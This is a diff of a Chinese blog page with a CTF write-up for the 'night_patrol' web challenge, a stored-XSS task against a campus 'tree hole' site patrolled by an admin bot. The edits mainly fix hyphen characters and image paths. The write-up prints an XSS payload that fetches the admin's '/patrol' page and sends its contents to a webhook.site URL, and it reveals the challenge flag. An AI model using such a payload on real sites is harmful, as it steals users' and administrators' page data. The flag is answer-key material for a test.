@@ -6,22 +6,22 @@
   
   <title>鲲鹏杯web-[night_patrol] | past</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="鲲鹏杯web-[night_patrol]  鲲鹏杯web题目  本题考点：存储型 XSS，窃取内网 &#x2F; 管理员浏览器页面内容（XSS 数据外带） flag:NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99} 靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名  打开F12,可以找到 document.getElementById(&#39;star">
+  <meta name="description" content="鲲鹏杯web-[night_patrol]  鲲鹏杯web题目  本题考点：存储型 XSS，窃取内网 &#x2F; 管理员浏览器页面内容（XSS 数据外带） flag:NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99} 靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名  打开F12,可以找到 document.getElementById(&#39;star">
 <meta property="og:type" content="article">
 <meta property="og:title" content="鲲鹏杯web-[night_patrol]">
 <meta property="og:url" content="https://xiafujian.github.io/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/index.html">
 <meta property="og:site_name" content="past">
-<meta property="og:description" content="鲲鹏杯web-[night_patrol]  鲲鹏杯web题目  本题考点：存储型 XSS，窃取内网 &#x2F; 管理员浏览器页面内容（XSS 数据外带） flag:NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99} 靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名  打开F12,可以找到 document.getElementById(&#39;star">
+<meta property="og:description" content="鲲鹏杯web-[night_patrol]  鲲鹏杯web题目  本题考点：存储型 XSS，窃取内网 &#x2F; 管理员浏览器页面内容（XSS 数据外带） flag:NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99} 靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名  打开F12,可以找到 document.getElementById(&#39;star">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/1.png">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/2.png">
-<meta property="og:image" content="https://xiafujian.github.io/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/image.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/webhook-url.png">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/3.png">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/4.png">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/5.png">
 <meta property="og:image" content="https://xiafujian.github.io/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/6.png">
 <meta property="article:published_time" content="2026-10-16T13:33:22.204Z">
-<meta property="article:modified_time" content="2026-10-16T14:19:56.853Z">
+<meta property="article:modified_time" content="2026-10-19T06:19:51.564Z">
 <meta property="article:author" content="past">
 <meta property="article:tag" content="SSTI">
 <meta property="article:tag" content="Web">
@@ -118,7 +118,7 @@
 <li>鲲鹏杯web题目</li>
 </ul>
 <p>本题考点：<strong>存储型 XSS，窃取内网 / 管理员浏览器页面内容（XSS 数据外带）</strong><br>
-flag:<code>NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99}</code></p>
+flag:<code>NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99}</code></p>
 <p>靶场是一个校园树洞网站,有一个巡查机器人(小灵通)会读今日执行的签名</p>
 <p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/1.png" alt="alt text"></p>
 <p>打开F12,可以找到<br>
@@ -137,8 +137,8 @@ flag:<code>NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99}</code></p>
 </ol>
 <p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/2.png" alt="alt text"></p>
 <p>然后打开https://webhook.site获得一个专属URL:</p>
-<p><img src="image.png" alt="alt text"></p>
-<p>我的是https://webhook.site/d2fe4ec2‑9292‑48ee‑9130‑6b6bc0e1ca39</p>
+<p><img src="/image/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/webhook-url.png" alt="alt text"></p>
+<p>我的是https://webhook.site/d2fe4ec2-9292-48ee-9130-6b6bc0e1ca39</p>
 <p>然后就可以返回靶场,将XSS Payload输入到我的签名当中:<br>
 <code> &lt;img src=x onerror=&quot;fetch('/patrol').then(r=&gt;r.text()).then(t=&gt;location='https://webhook.site/d2fe4ec2-9292-48ee-9130-6b6bc0e1ca39/?d='+encodeURIComponent(t))&quot;&gt;</code></p>
 <p>后面的网址要根据自己的URL去修改<br>
@@ -156,7 +156,7 @@ flag:<code>NSSCTF{60ad8607‑7f07‑4fc0‑ba19‑b5a1e232ab99}</code></p>
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://xiafujian.github.io/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" data-id="cuidD1E5jV74vVvExR_6D0aEj" data-title="鲲鹏杯web-[night_patrol]" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://xiafujian.github.io/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" data-id="cuidgq01kCHFO0V58m9-t8G2I" data-title="鲲鹏杯web-[night_patrol]" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
